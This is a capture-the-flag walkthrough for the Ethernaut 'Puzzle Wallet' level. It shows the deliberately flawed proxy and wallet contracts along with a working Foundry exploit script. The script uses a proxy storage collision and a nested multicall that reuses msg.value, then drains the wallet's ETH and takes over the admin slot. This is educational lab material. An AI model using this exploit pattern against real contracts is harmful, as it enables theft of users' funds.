# Level 24 - Puzzle Wallet ⏺⏺⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/24" %}

### Level Setup

{% hint style="info" %}
Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

&#x20; You'll need to hijack this wallet to become the admin of the proxy.

&#x20; Things that might help:

* Understanding how `delegatecall` works and how `msg.sender` and `msg.value` behaves when performing one.
* Knowing about proxy patterns and the way they handle storage variables.
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/a89c8f7832258655c09fde16e6602c78e5e99dbd/contracts/src/levels/PuzzleWallet.sol" %}

{% code lineNumbers="true" fullWidth="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```
{% endcode %}

### Exploit

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-1

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-1

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/2115458fb47e0c4e09d72c743cbfc6de865611a8/script/Level24.s.sol" %}

{% code title="script/Level24.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

// ================================================================
// │                    LEVEL 24 - PUZZLE WALLET                  │
// ================================================================
interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
}

interface IPuzzleWallet {
    function addToWhitelist(address addr) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function multicall(bytes[] calldata data) external payable;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IPuzzleProxy puzzleProxy = IPuzzleProxy(targetContractAddress);
        IPuzzleWallet puzzleWallet = IPuzzleWallet(targetContractAddress);

        vm.startBroadcast();

        // Make msg.sender the owner of the PuzzleWallet
        // contract by calling proposeNewAdmin on the PuzzleProxy contract
        puzzleProxy.proposeNewAdmin(msg.sender);

        // Add msg.sender address to the whitelist
        puzzleWallet.addToWhitelist(msg.sender);

        // Build multicall payload
        // - Call deposit twice in two separate multicalls wrapped inside a single multicall
        //
        //         multicall
        //            |
        //     -----------------
        //     |               |
        //  multicall        multicall
        //     |                 |
        //   deposit          deposit

        // Add the deposit function to a bytes array for the multicall payload
        bytes[] memory depositDataArray = new bytes[](1);
        depositDataArray[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);

        // Create a single multicall payload with two multicall payloads which each call the deposit function
        bytes[] memory multicallPayload = new bytes[](2);
        multicallPayload[0] = abi.encodeWithSelector(puzzleWallet.multicall.selector, depositDataArray);
        multicallPayload[1] = abi.encodeWithSelector(puzzleWallet.multicall.selector, depositDataArray);

        uint256 balance = address(puzzleProxy).balance;

        // Call multicall to deposit twice with the same value
        puzzleWallet.multicall{value: balance}(multicallPayload);

        // Drain the contract by draining twice the balance that was deposited
        puzzleWallet.execute(msg.sender, balance * 2, abi.encode(0x0));

        // Set max balance to msg.sender address to set PuzzleProxy admin to msg.sender
        puzzleWallet.setMaxBalance(uint256(uint160(address(msg.sender))));

        vm.stopBroadcast();
    }
}

```
{% endcode %}
{% endtab %}
{% endtabs %}

Submit instance... 🥳

### Completion Message

{% hint style="info" %}
Next time, those friends will request an audit before depositing any money on a contract. Congrats!

Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level.

Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, `msg.value` will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple `delegatecall`s to a function that looks safe on its own could lead to unwanted transfers of ETH, as `delegatecall`s keep the original `msg.value` sent to the contract.

Move on to the next level when you're ready!
{% endhint %}

### Notes

{% embed url="https://github.com/nvnx7/ethernaut-openzeppelin-hacks/blob/main/level_24_Puzzle-Wallet.md" %}
